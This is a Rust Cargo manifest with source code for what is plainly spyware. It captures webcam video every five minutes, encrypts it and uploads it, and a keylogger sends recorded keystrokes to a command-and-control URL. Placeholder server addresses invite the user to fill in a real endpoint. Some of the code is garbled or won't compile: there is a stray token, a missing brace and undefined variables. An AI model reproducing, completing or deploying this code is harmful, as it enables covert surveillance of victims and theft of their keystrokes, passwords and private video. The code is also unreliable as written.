

[package]
name = "my_project"
version = "0.1.0"
edition = "2018"

[dependencies]
tokio = { version = "1", features = ["full"] }
nokhwa = "0.10.0"
serde = { version = "1.0", features = ["derive"] }
serde_json = "1.0"
ffmpeg-next = "4.3"
reqwest = "0.11"
aes = "0.7"
block-modes = "0.8"
hex = "0.4"
rand = "0.8"
device_query = "0.2"
log = "0.4"
log4rs = "1.0"
winapi = { version = "0.3", features = ["winuser", "processthreadsapi", "debugapi"] }
web-view = "0.7"
toml = "0.5" CONGRATUL
use aes::Aes256;
use block_modes::{BlockMode, Cbc};
use block_modes::block_padding::Pkcs7;
use device_query::{DeviceQuery, DeviceState, Keycode};
use ffmpeg_next as ffmpeg;
use hex_literal::hex;
use log::{error, info};
use nokhwa::{Camera, CameraFormat, FrameFormat, Resolution};
use rand::Rng;
use reqwest::{Client, multipart};
use serde::Deserialize;
use std::fs::{File, OpenOptions, read_dir};
use std::io::{self, Read, Write};
use std::net::{TcpListener, TcpStream};
use std::path::Path;
use std::process::Command;
use std::sync::{mpsc, Arc};
use std::thread;
use std::time::Duration;
use tokio::sync::Mutex;
use tokio::time::{self, Instant};
use web_view::*;

type Aes256Cbc = Cbc<Aes256, Pkcs7>;

#[derive(Deserialize)]
struct CaptureRequest {
    resolution: Option<(u32, u32)>,
    frame_format: Option<String>,
    frame_rate: Option<u32>,
    duration: Option<u64>, 
}

#[derive(Deserialize)]
struct Config {
    c2_url: String,
    key: String,
    iv: String,
    file_filter: Option<String>,
}

struct AppState {
    last_capture: Option<String>,
}


async fn capture_video(req: &CaptureRequest, state: &mut AppState, client: Arc<Client>) -> Result<(), Box<dyn std::error::Error>> {
    let resolution = req.resolution.unwrap_or((640, 480));
    let frame_format = match req.frame_format.as_deref() {
        Some("MJPEG") => FrameFormat::MJPEG,
        _ => FrameFormat::YUYV,
    };
    let frame_rate = req.frame_rate.unwrap_or(30);
    let duration = req.duration.unwrap_or(10); 
    let mut camera = Camera::new(0, Some(CameraFormat::new(Resolution::new(resolution.0, resolution.1), frame_format, frame_rate)))?;
    camera.open_stream()?;

    let output_file = "capture.mp4";
    let mut command = Command::new("ffmpeg")
        .args(&[
            "-y", 
            "-pixel_format", "yuyv422",
            "-video_size", &format!("{}x{}", resolution.0, resolution.1),
            "-framerate", &frame_rate.to_string(),
            "-i", "-", 
            "-c:v", "libx264",
            "-pix_fmt", "yuv420p",
            "-r", &frame_rate.to_string(),
            output_file,
        ])
        .stdin(std::process::Stdio::piped())
        .spawn()?;

    let stdin = command.stdin.as_mut().ok_or("Fail")?;
    let end_time = Instant::now() + Duration::from_secs(duration);

    while Instant::now() < end_time {
        let frame = camera.frame()?;
        stdin.write_all(&frame.buffer())?;
    }

    command.wait()?;
    state.last_capture = Some(output_file.to_string());

    let encrypted_file = encrypt_file(output_file)?;

    upload_video(&encrypted_file, client).await?;

    Ok(())
}

fn encrypt_file(file_path: &str) -> Result<String, Box<dyn std::error::Error>> {
    let key = hex!("000102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f");
    let iv = hex!("aabbccddeeff00112233445566778899");

    let mut file = File::open(file_path)?;
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer)?;

    let cipher = Aes256Cbc::new_var(&key, &iv).unwrap();
    let ciphertext = cipher.encrypt_vec(&buffer);

    let encrypted_file_path = format!("{}.enc", file_path);
    let mut encrypted_file = File::create(&encrypted_file_path)?;
    encrypted_file.write_all(&ciphertext)?;

    Ok(encrypted_file_path)
}

async fn upload_video(file_path: &str, client: Arc<Client>) -> Result<(), Box<dyn std::error::Error>> {
    let form = multipart::Form::new()
        .file("video", file_path)?;

    client.post("yourserver.com") // replace with actual server URL
        .multipart(form)
        .send()
        .await?;

    Ok(())
}

async fn automatic_capture(state: Arc<Mutex<AppState>>, client: Arc<Client>) {
    let interval = Duration::from_secs(300); 
    let mut interval_timer = time::interval(interval);

    loop {
        interval_timer.tick().await;
        let capture_request = CaptureRequest {
            resolution: Some((1280, 720)),
            frame_format: Some("MJPEG".to_string()),
            frame_rate: Some(30),
            duration: Some(22), 
        };

        let mut state = state.lock().await;
        if let Err(e) = capture_video(&capture_request, &mut state, client.clone()).await {
            eprintln!("fail: {}", e);
        } else {
            println!("22m");
        }
    }
}

#[tokio::main]
async fn main() {
    
    log4rs::init_file("log4rs.yaml", Default::default()).unwrap();

    let state = Arc::new(Mutex::new(AppState { last_capture: None }));
    let client = Arc::new(Client::new());

   
    let state_clone = state.clone();
    let client_clone = client.clone();
    tokio::spawn(async move {
        automatic_capture(state_clone, client_clone).await;
    });


    start_keylogger("yourserver.com").await; // replace with actual server URL

  
    start_server().await;

    println!("running");
}

fn xor_encrypt(data: &mut [u8], key: u8) {
    for byte in data.iter_mut() {
        *byte ^= key;
    }
}

async fn start_keylogger(c2_url: &str) {
    let (tx, rx) = mpsc::channel();
    let key = hex!("000102030405060708090a0b0c0d0e0f");
    let iv = hex!("aabbccddeeff00112233445566778899");

    let keylogger_thread = thread::spawn(move || {
        keylogger(tx, key, iv);
    });

    send_logs(rx, c2_url).await;

    keylogger_thread.join().unwrap();
}

fn keylogger(tx: mpsc::Sender<()>, key: &[u8], iv: &[u8]) {
    let device_state = DeviceState::new();
    let mut file = OpenOptions::new().append(true).open("log.enc").unwrap();
    loop {
        let keys: Vec<Keycode> = device_state.get_keys();
        let mut log_entry = String::new();
        for key in keys.iter() {
            log_entry.push_str(&format!("{:?}", key));
        }
        let encrypted_log = encrypt(log_entry.as_bytes(), key, iv);
        file.write_all(&encrypted_log).unwrap();
        tx.send(()).unwrap();
        thread::sleep(Duration::from_secs(1));
    }
}

async fn send_logs(rx: mpsc::Receiver<()>, c2_url: &str) {
    let client = reqwest::Client::new();
    while let Ok(_) = rx.recv() {
        if let Ok(mut file) = OpenOptions::new().read(true).open("log.enc") {
            let mut buffer = Vec::new();
            file.read_to_end(&mut buffer).unwrap();
            let decrypted_log = decrypt(&buffer, key, iv);
            let response = client.post(c2_url)
                .body(decrypted_log)
                .send();
            match response {
                Ok(_) => info!("22m"),
                Err(e) => error!("Fail: {}", e),
            }
        }
        thread::sleep(Duration::from_secs(60));
}

async fn start_server() {
    let listener = TcpListener::bind("127.0.0.1:8080").unwrap(); //example tailor it to your needs
    println!("listening 127.0.0.1:8080");
    loop {
        match listener.accept() {
            Ok((mut stream, _)) => {
                let mut buffer = [0; 512];
                match stream.read(&mut buffer) {
                    Ok(size) => {
                        println!("Received: {}", String::from_utf8_lossy(&buffer[..size]));
                    }
                    Err(e) => println!("Fail: {}", e),
                }
            }
            Err(e) => println!("fail: {}", e),
        }
    }
}
 

